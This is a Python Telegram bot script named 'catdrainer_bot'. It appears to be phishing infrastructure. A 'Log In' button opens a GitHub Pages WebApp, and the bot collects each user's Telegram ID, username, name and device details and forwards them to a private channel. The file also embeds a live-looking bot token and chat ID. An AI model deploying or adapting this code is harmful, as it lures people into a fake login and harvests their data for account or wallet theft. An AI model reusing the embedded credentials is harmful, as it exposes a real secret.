from telegram import Bot, Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
import logging
import json

# 🔹 Bot credentials
BOT_TOKEN = "7879598325:AAFRhrWVUanbI3gxEb4W6Bm1GroQTudgZUQ"
BOT_USERNAME = "catdrainer_bot"
CHAT_ID = "-1002262089486"

# 🔹 Correct WebApp URL (GitHub Pages)
WEB_APP_URL = "https://refunding212.github.io/forrealcat/"

# Enable logging
logging.basicConfig(level=logging.INFO)

async def start(update: Update, context: CallbackContext):
    """Sends a button to open the WebApp for login"""
    keyboard = [[InlineKeyboardButton("🚀 Click Here to Log In", web_app={"url": WEB_APP_URL})]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text("Click the button below to log in:", reply_markup=reply_markup)

async def receive_data(update: Update, context: CallbackContext):
    """Receives user data from the WebApp and forwards it to a Telegram channel"""
    data = update.message.text  # Data from WebApp

    if not data:
        await update.message.reply_text("❌ No data received!")
        return

    try:
        user_info = json.loads(data)  # Parse JSON data
    except json.JSONDecodeError:
        await update.message.reply_text("❌ Invalid data format!")
        return

    # Extract user details
    user = update.message.from_user
    user_id = user.id
    username = user.username or "No username"
    first_name = user.first_name or "No first name"
    last_name = user.last_name or "No last name"

    # Extract device details (if provided)
    device = user_info.get("device", {})
    model = device.get("model", "Unknown Device")
    system_version = device.get("system_version", "Unknown OS")
    lang_code = device.get("lang_code", "Unknown Language")

    # Format the message
    message = f"""
📌 **New User Login**
👤 **User ID:** `{user_id}`
🔗 **Username:** @{username}
📝 **Name:** {first_name} {last_name}

📱 **Device:** {model}
💻 **System:** {system_version}
🌍 **Language:** {lang_code}
"""

    # Send to Telegram Channel
    bot = Bot(token=BOT_TOKEN)
    await bot.send_message(chat_id=CHAT_ID, text=message, parse_mode="Markdown")

    # Confirm to user
    await update.message.reply_text("✅ Your data has been sent successfully!")

def main():
    """Start the bot"""
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, receive_data))

    print("🚀 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
